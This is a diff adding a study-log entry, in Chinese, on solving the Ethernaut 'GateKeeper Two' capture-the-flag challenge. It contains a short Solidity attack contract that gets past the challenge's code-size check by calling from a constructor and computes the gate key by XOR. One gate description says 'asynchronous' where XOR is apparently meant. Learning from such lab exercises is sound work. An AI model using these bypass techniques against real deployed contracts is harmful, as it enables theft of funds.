@@ -395,4 +395,21 @@ contract AttackGatekeeperOne {
 }
 ```
 
+### 2024.09.16
+#### Ethernaut - GateKeeper Two
+和 GateKeeper One 类似，需要过几个关卡
+关卡1: 要求使用合约来调用 enter 方法
+关卡2: 可以在合约的 constructor 方法中调用目标合约，这时候它还没有完成实例化，代码大小为 0
+关卡3: 学习如何进行异步运算
+实例地址：0x50d7242F965a27b97d15312b5370aF71079C1113
+```
+contract AttackGatekeeperTwo {
+    constructor() {
+        bytes8 _gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(this)))));
+        address gateAddr = 0x50d7242F965a27b97d15312b5370aF71079C1113;
+        GatekeeperTwo(gateAddr).enter(_gateKey);
+    }
+}
+```
+
 <!-- Content_END -->
